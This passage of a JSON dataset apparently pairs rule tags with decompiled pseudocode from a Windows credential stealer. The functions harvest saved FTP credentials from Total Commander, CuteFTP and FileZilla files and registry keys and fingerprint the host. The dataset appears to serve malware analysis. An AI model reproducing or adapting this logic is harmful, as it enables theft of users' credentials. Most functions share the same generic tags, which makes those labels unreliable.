&var_13eh);\n            } while (iVar2 != 0);\n            fcn.0041071e(iVar1);\n        }\n    }\n    fcn.004018b8(var_148h);\n    return;\n}\n",
        "token_count": 783
    },
    "004043dc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004043dc(uchar *arg_8h, uint32_t *arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    uchar *puVar4;\n    uint32_t var_10h;\n    uchar *var_ch;\n    uint32_t var_8h;\n    uchar *var_4h;\n    \n    uVar3 = 0;\n    var_8h = *arg_ch;\n    var_4h = arg_8h;\n    var_ch = NULL;\n    if ((*0x414b43 != NULL) && (arg_8h != NULL)) {\n        if (arg_10h == 0) {\n            arg_10h = 0;\n        }\n        iVar1 = (**0x414b43)(&var_8h, 0, arg_10h, 0, 0, 1, &var_10h);\n        if ((iVar1 != 0) && (var_ch != NULL)) {\n            if (var_10h < *arg_ch || var_10h == *arg_ch) {\n                uVar3 = 1;\n                uVar2 = var_10h;\n                puVar4 = var_ch;\n                if (var_10h != 0) {\n                    for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n                        *arg_8h = *puVar4;\n                        puVar4 = puVar4 + 1;\n                        arg_8h = arg_8h + 1;\n                    }\n                }\n                *arg_ch = var_10h;\n            }\n            fcn.0041067c(var_ch);\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 389
    },
    "0040446a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.0040446a(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    uint uVar4;\n    int32_t var_4h;\n    \n    iVar1 = fcn.00410724(\"kernel32.dll\");\n    var_4h = 0;\n    if (iVar1 != 0) {\n        iVar2 = fcn.004106c4(iVar1, \"GetNativeSystemInfo\");\n        if (iVar2 != 0) {\n            pcVar3 = fcn.004106c4(iVar1, \"IsWow64Process\");\n            if (pcVar3 != NULL) {\n                uVar4 = fcn.004106dc(&var_4h);\n                (*pcVar3)(uVar4);\n                if (var_4h != 0) {\n                    return 1;\n                }\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 204
    },
    "004044d2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.004044d2(void)\n\n{\n    int32_t iVar1;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_6h;\n    uchar uStack6;\n    uchar uStack5;\n    \n    if (((*0x414aff != NULL) && (*0x414b03 != NULL)) && (*0x414b07 != NULL)) {\n        var_6h._0_1_ = 0;\n        var_6h._1_1_ = 0;\n        var_6h._2_1_ = 0;\n        var_6h._3_1_ = 0;\n        uStack6 = 0;\n        uStack5 = 5;\n        iVar1 = (**0x414aff)(&var_6h, 2, 0x20, 0x220, 0, 0, 0, 0, 0, 0, &var_ch);\n        if (iVar1 == 0) {\n            return iVar1;\n        }\n        var_10h = 0;\n        iVar1 = (**0x414b03)(0, var_ch, &var_10h);\n        if (iVar1 == 0) {\n            var_10h = 0;\n        }\n        (**0x414b07)(var_ch);\n        return var_10h;\n    }\n    return 1;\n}\n",
        "token_count": 315
    },
    "004045fd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004045fd(uint arg_8h)\n\n{\n    bool bVar1;\n    int32_t iVar2;\n    uint uVar3;\n    code *pcVar4;\n    uint32_t uVar5;\n    uint *puVar6;\n    uint var_d4h;\n    uint var_d0h;\n    int32_t var_ach;\n    uint32_t var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_8ch;\n    uint var_4h;\n    \n    var_4h = fcn.004015f0(arg_8h, 0, 0);\n    fcn.00401569(arg_8h, 0xbeef0001);\n    fcn.004018e6(&var_a0h, 0x9c);\n    var_a0h = 0x9c;\n    iVar2 = fcn.0041072a(&var_a0h);\n    bVar1 = false;\n    puVar6 = &var_8ch;\n    for (uVar5 = 0; uVar5 < 0x80; uVar5 = uVar5 + 1) {\n        if (*puVar6 == '\\0') {\n            bVar1 = true;\n        }\n        if (bVar1) {\n            *puVar6 = '\\0';\n        }\n        puVar6 = puVar6 + 1;\n    }\n    if (iVar2 == 0) {\n        fcn.0040159f(arg_8h, 0, 0);\n    }\n    else {\n        fcn.0040159f(arg_8h, &var_a0h, 0x9c);\n    }\n    uVar3 = fcn.0040446a();\n    fcn.00401569(arg_8h, uVar3);\n    var_a4h = fcn.004018cf(0x400);\n    uVar3 = fcn.00410730(0x400, 0x1002, var_a4h, 0x3ff);\n    fcn.0040159f(arg_8h, var_a4h, uVar3);\n    uVar3 = fcn.00410730(0x400, 0x1001, var_a4h, 0x3ff);\n    fcn.0040159f(arg_8h, var_a4h, uVar3);\n    uVar3 = fcn.004044d2();\n    fcn.00401569(arg_8h, uVar3);\n    fcn.0040456c();\n    var_ach = fcn.004027f7(\"HWID\", &var_a8h);\n    if ((var_ach == 0) || (var_a8h < 0x14)) {\n        fcn.0040159f(arg_8h, 0, 0);\n    }\n    else {\n        var_a8h = var_a8h + 4;\n        fcn.00401569(arg_8h, var_a8h);\n        var_a8h = var_a8h - 4;\n        fcn.00401569(arg_8h, 0xffffffff);\n        fcn.0040157e(arg_8h, var_ach, var_a8h);\n    }\n    fcn.004018b8(var_ach);\n    fcn.004018b8(var_a4h);\n    bVar1 = false;\n    iVar2 = fcn.00410724(\"kernel32.dll\");\n    if (iVar2 != 0) {\n        pcVar4 = fcn.004106c4(iVar2, \"GetNativeSystemInfo\");\n        if (pcVar4 != NULL) {\n            (*pcVar4)(&var_d0h);\n            bVar1 = true;\n        }\n    }\n    if (!bVar1) {\n        fcn.00410736(&var_d0h);\n    }\n    fcn.0040159f(arg_8h, &var_d0h, 0x24);\n    fcn.00401636(arg_8h, var_4h);\n    return;\n}\n",
        "token_count": 901
    },
    "0040480d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040480d(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_818h;\n    int32_t var_814h;\n    int32_t var_810h;\n    uint var_80ch;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.004107c6(*0x414869, arg_ch, &var_4h);\n    if (iVar1 == 0) {\n        var_8h = 0;\n        while( true ) {\n            var_ch = 0x7ff;\n            iVar1 = fcn.004107ea();\n            if (iVar1 != 0) break;\n            if ((var_814h == 1) || (var_814h == 7)) {\n                iVar1 = fcn.00410808(&var_80ch, \"Line\");\n                if (iVar1 != 0) {\n                    iVar1 = fcn.00401d71(*0x414869, arg_ch, &var_80ch, &var_818h);\n                    if (iVar1 != 0) {\n                        var_810h = iVar1;\n                        fcn.00401569(arg_8h, 0xbeef0001);\n                        if (var_814h == 1) {\n                            fcn.00401569(arg_8h, 0);\n                        }\n                        else {\n                            fcn.00401569(arg_8h, 1);\n                        }\n                        fcn.0040159f(arg_8h, var_810h, var_818h);\n                        fcn.004018b8(var_810h);\n                    }\n                }\n                var_8h = var_8h + 1;\n            }\n            else {\n                var_8h = var_8h + 1;\n            }\n        }\n        fcn.004107c0(var_4h);\n    }\n    return;\n}\n",
        "token_count": 432
    },
    "0040491b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040491b(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint arg_8h_00;\n    uint arg_ch_00;\n    int32_t arg_ch_01;\n    int32_t arg_ch_02;\n    uint var_81ch;\n    uint var_818h;\n    uint var_814h;\n    uint var_810h;\n    uint var_80ch;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.004107c6(*0x414869, arg_ch, &var_4h);\n    if (iVar1 == 0) {\n        var_8h = 0;\n        while( true ) {\n            var_ch = 0x7ff;\n            iVar1 = fcn.004107cc(var_4h, var_8h, &var_80ch, &var_ch, 0, 0, 0, 0);\n            if (iVar1 != 0) break;\n            arg_8h_00 = fcn.00401df8(arg_ch, 0x414845);\n            arg_ch_00 = fcn.00401df8(arg_8h_00, &var_80ch);\n            fcn.004018b8(arg_8h_00);\n            iVar1 = fcn.00401d71(*0x414869, arg_ch_00, 0x4150e1, 0);\n            arg_ch_01 = fcn.00401d71(*0x414869, arg_ch_00, 0x4150ea, 0);\n            arg_ch_02 = fcn.00401d71(*0x414869, arg_ch_00, 0x4150f3, 0);\n            if (((iVar1 != 0) && (arg_ch_01 != 0)) && (arg_ch_02 != 0)) {\n                fcn.00401569(arg_8h, 0xbeef0000);\n                fcn.004015cb(arg_8h, arg_ch_01);\n                fcn.004015cb(arg_8h, arg_ch_02);\n                fcn.004015cb(arg_8h, iVar1);\n            }\n            fcn.004018b8(iVar1);\n            fcn.004018b8(arg_ch_01);\n            fcn.004018b8(arg_ch_02);\n            fcn.0040491b(arg_8h, arg_ch_00);\n            fcn.004018b8(arg_ch_00);\n            var_8h = var_8h + 1;\n        }\n        fcn.004107c0(var_4h);\n    }\n    return;\n}\n",
        "token_count": 605
    },
    "00404b1e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404b1e(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    \n    if (arg_ch != 0) {\n        iVar1 = fcn.004025a9(arg_ch);\n        if (iVar1 == 0) {\n            arg_ch = fcn.00401e4c(arg_ch, 0x414845);\n        }\n        iVar1 = fcn.00401d71(*0x414869, \"Software\\\\Ghisler\\\\Windows Commander\", \"FtpIniName\", 0);\n        if (iVar1 != 0) {\n            uVar2 = fcn.00401df8(arg_ch, iVar1);\n            uVar3 = arg_8h;\n            fcn.00404b07(arg_8h, uVar2);\n            fcn.004018b8(uVar3);\n            fcn.004018b8(uVar3);\n        }\n        iVar1 = fcn.00401d71(0x80000002, \"Software\\\\Ghisler\\\\Windows Commander\", \"FtpIniName\", 0);\n        if (iVar1 != 0) {\n            uVar2 = fcn.00401df8(arg_ch, iVar1);\n            uVar3 = arg_8h;\n            fcn.00404b07(arg_8h, uVar2);\n            fcn.004018b8(uVar3);\n            fcn.004018b8(uVar3);\n        }\n        iVar1 = fcn.00401d71(*0x414869, \"Software\\\\Ghisler\\\\Total Commander\", \"FtpIniName\", 0);\n        if (iVar1 != 0) {\n            uVar2 = fcn.00401df8(arg_ch, iVar1);\n            uVar3 = arg_8h;\n            fcn.00404b07(arg_8h, uVar2);\n            fcn.004018b8(uVar3);\n            fcn.004018b8(uVar3);\n        }\n        iVar1 = fcn.00401d71(0x80000002, \"Software\\\\Ghisler\\\\Total Commander\", \"FtpIniName\", 0);\n        if (iVar1 != 0) {\n            uVar2 = fcn.00401df8(arg_ch, iVar1);\n            uVar3 = arg_8h;\n            fcn.00404b07(arg_8h, uVar2);\n            fcn.004018b8(uVar3);\n            fcn.004018b8(uVar3);\n        }\n        uVar3 = fcn.00401df8(arg_ch, \"wcx_ftp.ini\");\n        fcn.00404b07(arg_8h, uVar3);\n        fcn.004018b8(arg_8h);\n        fcn.004018b8(arg_ch);\n    }\n    return;\n}\n",
        "token_count": 641
    },
    "00404e73": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404e73(uchar *arg_8h, char *arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uchar *arg_8h_00;\n    uint var_14ch;\n    uint var_148h;\n    uint var_144h;\n    uint32_t var_13eh;\n    uchar auStack278 [274];\n    \n    var_148h = 0;\n    if ((arg_ch != NULL) && (*arg_ch != '\\0')) {\n        iVar1 = fcn.004025a9(arg_ch);\n        if (iVar1 == 0) {\n            var_148h = fcn.00401df8(arg_ch, \"\\\\*.*\");\n        }\n        else {\n            var_148h = fcn.00401df8(arg_ch, 0x414f8e);\n        }\n        fcn.004018e6(&var_13eh, 0x13e);\n        iVar1 = fcn.0041070c(var_148h, &var_13eh);\n        if (iVar1 != -1) {\n            do {\n                if ((var_13eh & 0x10) == 0) {\n                    arg_8h_00 = auStack278;\n                    iVar2 = fcn.00410808();\n                    if (iVar2 != 0) {\n                        uVar3 = fcn.00401df8(arg_ch, 0x414845);\n                        uVar3 = fcn.00401e4c(uVar3, auStack278);\n                        if (arg_10h == 0) {\n                            iVar2 = 1;\n                        }\n                        else {\n                            iVar2 = fcn.00410808();\n                        }\n                        if (iVar2 != 0) {\n                            arg_8h_00 = arg_8h;\n                            fcn.00404e5c(arg_8h, uVar3);\n                        }\n                        fcn.004018b8(arg_8h_00);\n                    }\n                }\n                else {\n                    arg_8h_00 = 0x414f84;\n                    iVar2 = fcn.00410712();\n                    if (iVar2 != 0) {\n                        arg_8h_00 = 0x414f86;\n                        iVar2 = fcn.00410712();\n                        if (iVar2 != 0) {\n                            uVar3 = fcn.00401df8(arg_ch, 0x414845);\n                            uVar3 = fcn.00401e4c(uVar3, auStack278);\n                            arg_8h_00 = arg_8h;\n                            fcn.00404e73(arg_8h, uVar3, arg_10h);\n                            fcn.004018b8(arg_8h_00);\n                        }\n                    }\n                }\n                iVar2 = fcn.00410718(iVar1, &var_13eh, arg_8h_00);\n            } while (iVar2 != 0);\n            fcn.0041071e(iVar1);\n        }\n    }\n    fcn.004018b8(var_148h);\n    return;\n}\n",
        "token_count": 693
    },
    "004051e3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004051e3(uint arg_8h, char *arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint var_14ch;\n    uint var_148h;\n    uint var_144h;\n    uint32_t var_13eh;\n    uchar auStack278 [274];\n    \n    var_148h = 0;\n    if ((arg_ch != NULL) && (*arg_ch != '\\0')) {\n        uVar1 = fcn.00401df8(arg_ch, arg_10h);\n        uVar4 = arg_8h;\n        fcn.00405182(arg_8h, uVar1);\n        fcn.004018b8(uVar4);\n        var_148h = fcn.00401df8(arg_ch, \"\\\\*.*\");\n        uVar4 = 0x13e;\n        fcn.004018e6(&var_13eh, 0x13e);\n        iVar2 = fcn.0041070c(var_148h, &var_13eh);\n        if (iVar2 != -1) {\n            do {\n                if ((var_13eh & 0x10) != 0) {\n                    uVar4 = 0x414f84;\n                    iVar3 = fcn.00410712();\n                    if (iVar3 != 0) {\n                        uVar4 = 0x414f86;\n                        iVar3 = fcn.00410712();\n                        if (iVar3 != 0) {\n                            uVar4 = fcn.00401df8(arg_ch, 0x414845);\n                            uVar4 = fcn.00401e4c(uVar4, auStack278);\n                            uVar1 = fcn.00401e4c(uVar4, arg_10h);\n                            uVar4 = arg_8h;\n                            fcn.00405182(arg_8h, uVar1);\n                            fcn.004018b8(uVar4);\n                        }\n                    }\n                }\n                iVar3 = fcn.00410718(iVar2, &var_13eh, uVar4);\n            } while (iVar3 != 0);\n            fcn.0041071e(iVar2);\n        }\n    }\n    fcn.004018b8(var_148h);\n    return;\n}\n",
        "token_count": 523
    },
    "004053c3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004053c3(uint arg_8h)\n\n{\n    char cVar1;\n    uint arg_ch;\n    int32_t iVar2;\n    char *pcVar3;\n    char *arg_8h_00;\n    uint arg_8h_01;\n    uint var_4h;\n    \n    arg_ch = fcn.004015f0(arg_8h, 4, 0);\n    cVar1 = **0x4147ed;\n    arg_8h_00 = *0x4147ed;\n    do {\n        if (cVar1 == '\\0') {\n            fcn.0040531a(arg_8h, 0x1a);\n            fcn.0040531a(arg_8h, 0x23);\n            fcn.0040531a(arg_8h, 0x1c);\n            fcn.0040531a(arg_8h, 0x26);\n            fcn.00405199(arg_8h, \"Software\\\\GlobalSCAPE\\\\CuteFTP 6 Home\\\\QCToolbar\");\n            fcn.00405199(arg_8h, \"Software\\\\GlobalSCAPE\\\\CuteFTP 6 Professional\\\\QCToolbar\");\n            fcn.00405199(arg_8h, \"Software\\\\GlobalSCAPE\\\\CuteFTP 7 Home\\\\QCToolbar\");\n            fcn.00405199(arg_8h, \"Software\\\\GlobalSCAPE\\\\CuteFTP 7 Professional\\\\QCToolbar\");\n            fcn.00405199(arg_8h, \"Software\\\\GlobalSCAPE\\\\CuteFTP 8 Home\\\\QCToolbar\");\n            fcn.00405199(arg_8h, \"Software\\\\GlobalSCAPE\\\\CuteFTP 8 Professional\\\\QCToolbar\");\n            fcn.00401636(arg_8h, arg_ch);\n            return;\n        }\n        iVar2 = fcn.00410808();\n        if ((iVar2 != 0) && (iVar2 = fcn.0040242b(arg_8h_00),  iVar2 != 0)) {\n            arg_8h_01 = arg_8h;\n            fcn.004051e3(arg_8h, iVar2, \"\\\\sm.dat\");\n            fcn.004018b8(arg_8h_01);\n        }\n        iVar2 = -1;\n        pcVar3 = arg_8h_00;\n        do {\n            arg_8h_00 = pcVar3;\n            if (iVar2 == 0) break;\n            iVar2 = iVar2 + -1;\n            arg_8h_00 = pcVar3 + 1;\n            cVar1 = *pcVar3;\n            pcVar3 = arg_8h_00;\n        } while (cVar1 != '\\0');\n        cVar1 = *arg_8h_00;\n    } while( true );\n}\n",
        "token_count": 633
    },
    "004054a5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004054a5(uint arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    if (arg_ch != 0) {\n        fcn.0040406c(arg_8h, arg_ch, arg_10h);\n        fcn.004018b8(arg_ch);\n    }\n    return;\n}\n",
        "token_count": 78
    },
    "004057a7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004057a7(uint arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    uint uVar2;\n    \n    if (arg_ch != 0) {\n        uVar1 = fcn.00401df8(arg_ch, \"\\\\sitemanager.xml\");\n        uVar2 = arg_8h;\n        fcn.0040406c(arg_8h, uVar1, 0xbeef0000);\n        fcn.004018b8(uVar2);\n        uVar1 = fcn.00401df8(arg_ch, \"\\\\recentservers.xml\");\n        uVar2 = arg_8h;\n        fcn.0040406c(arg_8h, uVar1, 0xbeef0001);\n        fcn.004018b8(uVar2);\n        uVar2 = fcn.00401df8(arg_ch, \"\\\\filezilla.xml\");\n        fcn.0040406c(arg_8h, uVar2, 0xbeef0002);\n        fcn.004018b8(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 244
    },
    "00405844": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00405844(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, int32_t arg_28h)\n\n{\n    int32_t var_20h;\n    uint *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_ch = fcn.00401d71(*0x414869, arg_ch, arg_10h, 0);\n    var_4h = fcn.00401d71(*0x414869, arg_ch, arg_14h, 0);\n    var_8h = fcn.00401d71(*0x414869, arg_ch, arg_18h, 0);\n    var_10h = fcn.00401d71(*0x414869, arg_ch, arg_1ch, &var_18h);\n    var_14h = fcn.00401d71(*0x414869, arg_ch, arg_20h, 0);\n    var_1ch = fcn.00401d71(*0x414869, arg_ch, arg_24h, &var_20h);\n    if (((var_4h != 0) && (var_8h != 0)) && (var_ch != 0)) {\n        fcn.00401569(arg_8h, arg_28h);\n        fcn.004015cb(arg_8h, var_4h);\n        fcn.004015cb(arg_8h, var_8h);\n        fcn.004015cb(arg_8h, var_ch);\n        if (arg_28h == -0x4110ffed) {\n            fcn.004015cb(arg_8h, var_10h);\n        }\n        else {\n            fcn.0040159f(arg_8h, var_10h, var_18h);\n        }\n        fcn.004015cb(arg_8h, var_14h);\n        if ((var_1ch == NULL) || (var_20h != 4)) {\n            fcn.00401569(arg_8h, 0);\n        }\n        else {\n            fcn.00401569(arg_8h, *var_1ch);\n        }\n    }\n    fcn.004018b8(var_ch);\n    fcn.004018b8(var_4h);\n    fcn.004018b8(var_8h);\n    fcn.004018b8(var_10h);\n    fcn.004018b8(var_14h);\n    fcn.004018b8(var_1ch);\n    return;\n}\n",
        "token_count": 635
    },
    "00405bc0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00405bc0(char *arg_8h)\n\n{\n    char cVar1;\n    char *arg_8h_00;\n    int32_t iVar2;\n    uint uVar3;\n    char *arg_8h_01;\n    char *pcVar4;\n    char *pcVar5;\n    char *var_4h;\n    \n    var_4h = fcn.004015f0(arg_8h, 7, 0);\n    cVar1 = **0x4147f1;\n    arg_8h_01 = *0x4147ed;\n    arg_8h_00 = *0x4147f1;\n    do {\n        if (cVar1 == '\\0') {\n            fcn.00401636(arg_8h, var_4h);\n            return;\n        }\n        iVar2 = fcn.00410808();\n        if (iVar2 != 0) {\n            uVar3 = fcn.0040242b(arg_8h_01);\n            fcn.00404351(arg_8h_00, uVar3, 0x41554d, 0xbeef0000);\n            fcn.004018b8(arg_8h_00);\n        }\n        var_4h = 0x405c21;\n        iVar2 = fcn.00410808();\n        if (iVar2 != 0) {\n            uVar3 = fcn.0040242b(arg_8h_01);\n            pcVar4 = arg_8h_00;\n            fcn.00404351(arg_8h_00, uVar3, 0x41554d, 0xbeef0000);\n            fcn.004018b8(pcVar4);\n            var_4h = arg_8h_01;\n        }\n        for (; *arg_8h_01 != '\\0'; arg_8h_01 = arg_8h_01 + 1) {\n        }\n        arg_8h_01 = arg_8h_01 + 1;\n        iVar2 = -1;\n        pcVar4 = arg_8h_00;\n        do {\n            pcVar5 = pcVar4;\n            if (iVar2 == 0) break;\n            iVar2 = iVar2 + -1;\n            pcVar5 = pcVar4 + 1;\n            cVar1 = *pcVar4;\n            pcVar4 = pcVar5;\n        } while (cVar1 != '\\0');\n        cVar1 = *pcVar5;\n        arg_8h = arg_8h_00;\n        arg_8h_00 = pcVar5;\n    } while( true );\n}\n",
        "token_count": 602
    },
    "00405f4c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405f4c(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint arg_8h_00;\n    uint *arg_8h_01;\n    int32_t var_828h;\n    uint var_824h;\n    uint var_820h;\n    int32_t var_81ch;\n    int32_t var_818h;\n    int32_t var_814h;\n    uint var_810h;\n    uint var_80ch;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.004107c6(*0x414869, arg_ch, &var_4h);\n    if (iVar1 == 0) {\n        var_8h = 0;\n        while( true ) {\n            var_ch = 0x7ff;\n            iVar1 = fcn.004107cc(var_4h, var_8h, &var_80ch, &var_ch, 0, 0, 0, 0);\n            if (iVar1 != 0) break;\n            arg_8h_00 = fcn.00401df8(arg_ch, 0x414845);\n            var_810h = fcn.00401df8(arg_8h_00, &var_80ch);\n            fcn.004018b8(arg_8h_00);\n            var_81ch = fcn.00401d71(*0x414869, var_810h, 0x415726, 0);\n            var_814h = fcn.00401d71(*0x414869, var_810h, \"HostAdrs\", 0);\n            var_818h = fcn.00401d71(*0x414869, var_810h, 0x41572f, 0);\n            var_820h = fcn.00401d71(*0x414869, var_810h, \"RemoteDir\", 0);\n            arg_8h_01 = fcn.00401d71(*0x414869, var_810h, 0x41574b, &var_828h);\n            if ((arg_8h_01 == NULL) || (var_828h != 4)) {\n                if (arg_8h_01 != NULL) {\n                    fcn.004018b8(arg_8h_01);\n                }\n                var_824h = 0x15;\n            }\n            else {\n                var_824h = *arg_8h_01;\n                fcn.004018b8(arg_8h_01);\n            }\n            if (((var_81ch != 0) && (var_814h != 0)) && (var_818h != 0)) {\n                fcn.00401569(arg_8h, 0xbeef0000);\n                fcn.004015cb(arg_8h, var_814h);\n                fcn.004015cb(arg_8h, var_818h);\n                fcn.004015cb(arg_8h, var_81ch);\n                fcn.004015cb(arg_8h, var_820h);\n                fcn.00401569(arg_8h, var_824h);\n            }\n            fcn.004018b8(var_81ch);\n            fcn.004018b8(var_814h);\n            fcn.004018b8(var_818h);\n            fcn.004018b8(var_820h);\n            fcn.004018b8(var_810h);\n            var_8h = var_8h + 1;\n        }\n        fcn.004107c0(var_4h);\n    }\n    return;\n}\n",
        "token_count": 821
    },
    "004061e4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004061e4(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint arg_ch_00;\n    int32_t arg_ch_01;\n    int32_t arg_ch_02;\n    uint arg_ch_03;\n    uint var_824h;\n    uint var_820h;\n    uint var_81ch;\n    uint var_818h;\n    uint var_814h;\n    uint var_810h;\n    uint var_80ch;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.004107c6(*0x414869, arg_ch, &var_4h);\n    if (iVar1 == 0) {\n        var_8h = 0;\n        while( true ) {\n            var_ch = 0x7ff;\n            iVar1 = fcn.004107cc(var_4h, var_8h, &var_80ch, &var_ch, 0, 0, 0, 0);\n            if (iVar1 != 0) break;\n            uVar2 = fcn.00401df8(arg_ch, 0x414845);\n            arg_ch_00 = fcn.00401df8(uVar2, &var_80ch);\n            fcn.004018b8(uVar2);\n            iVar1 = fcn.00401d71(*0x414869, arg_ch_00, 0x415767, 0);\n            arg_ch_01 = fcn.00401d71(*0x414869, arg_ch_00, 0x415750, 0);\n            uVar2 = fcn.00401d71(*0x414869, arg_ch_00, 0x415759, 0);\n            arg_ch_02 = fcn.00401d71(*0x414869, arg_ch_00, 0x41575e, 0);\n            arg_ch_03 = fcn.00401d71(*0x414869, arg_ch_00, \"HostDirName\", 0);\n            if (((iVar1 != 0) && (arg_ch_01 != 0)) && (arg_ch_02 != 0)) {\n                fcn.00401569(arg_8h, 0xbeef0000);\n                fcn.004015cb(arg_8h, arg_ch_01);\n                fcn.004015cb(arg_8h, arg_ch_02);\n                fcn.004015cb(arg_8h, 